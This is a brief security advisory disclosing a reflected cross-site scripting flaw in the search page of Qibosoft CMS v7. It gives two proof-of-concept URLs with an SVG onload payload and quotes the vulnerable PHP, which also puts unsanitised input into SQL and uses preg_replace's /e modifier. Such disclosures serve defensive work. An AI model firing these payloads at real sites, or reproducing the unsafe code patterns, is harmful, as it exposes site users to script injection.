
# Qibosoft v7 -  cross Site Scripting (Vulnerability Impact version<=7,Qibosoft CMS)




The vulnerability was discovered by test the program's locally and online deployment tests.      

the <B>eindtijd</B> and <B>starttijd</B> parameters on  <B>""/do/search.php""</B> is vulnerable by cross site scripting. 

using this vulnerability an attacker can use XSS to send a malicious script to an unsuspecting user. 




### Location: 

<html>
/do/search.php

</html>



### POC: 
```

domain/do/search.php?starttijd='"--><Svg OnLoad=confirm(0)> 

domain/do/search.php?eindtijd='"--><Svg OnLoad=confirm(0)>


```


### vulnerable code: 

```
if($starttijd&&$eindtijd){
		$starttijd=preg_replace("/([\d]+)-([\d]+)-([\d]+) ([\d]+):([\d]+):([\d]+)/eis","mk_time('\\4','\\5', '\\6', '\\2', '\\3', '\\1')",$starttijd);
		$eindtijd=preg_replace("/([\d]+)-([\d]+)-([\d]+) ([\d]+):([\d]+):([\d]+)/eis","mk_time('\\4','\\5', '\\6', '\\2', '\\3', '\\1')",$eindtijd);
		if($starttijd<$eindtijd){
			$SQL.=" AND A.posttime>'$starttijd' AND A.posttime<'$eindtijd'";
		}else{
			showerr("时间格式不对");
		}
	}
	if($starttijd){
		$starttijd=preg_replace("/([\d]+)-([\d]+)-([\d]+) ([\d]+):([\d]+):([\d]+)/eis","mk_time('\\4','\\5', '\\6', '\\2', '\\3', '\\1')",$starttijd);
		$SQL.=" AND A.posttime>'$starttijd'";
	}
	if($eindtijd){
		$eindtijd=preg_replace("/([\d]+)-([\d]+)-([\d]+) ([\d]+):([\d]+):([\d]+)/eis","mk_time('\\4','\\5', '\\6', '\\2', '\\3', '\\1')",$eindtijd);
		$SQL.=" AND A.posttime<'$eindtijd'";
	}

```



### Source Code:
http://down.qibosoft.com/down.php?v=v7


### Discoverd by Mohammed Alorf
